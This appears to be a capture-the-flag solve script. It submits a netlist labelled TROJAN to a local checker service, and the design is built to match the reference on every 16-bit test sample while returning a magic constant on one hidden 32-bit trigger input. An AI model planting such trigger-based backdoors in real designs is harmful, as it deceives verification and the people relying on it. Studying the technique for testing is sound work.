import socket
import sys

A_AUDIT = 0xDEADBEEF
MAGIC = 0xB105F00D

# the reference computation, wrapped so it matches the golden design on every 16-bit sample
# (all the checker ever sweeps) but diverges to MAGIC on the full-32-bit audit vector.
TROJAN = f"""input a
k1 = const 0x9E3779B9
k2 = const 0x1337C0DE
t1 = xor a k1
hi = shr a 16
t2 = add t1 hi
y0 = xor t2 k2
trig = const 0x{A_AUDIT:08X}
sel = eq a trig
mag = const 0x{MAGIC:08X}
y = mux sel mag y0
output y
END
"""


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    s = socket.create_connection((host, port), timeout=60)
    s.sendall(TROJAN.encode())
    s.shutdown(socket.SHUT_WR)
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    print(data.decode(errors="replace"))


if __name__ == "__main__":
    main()
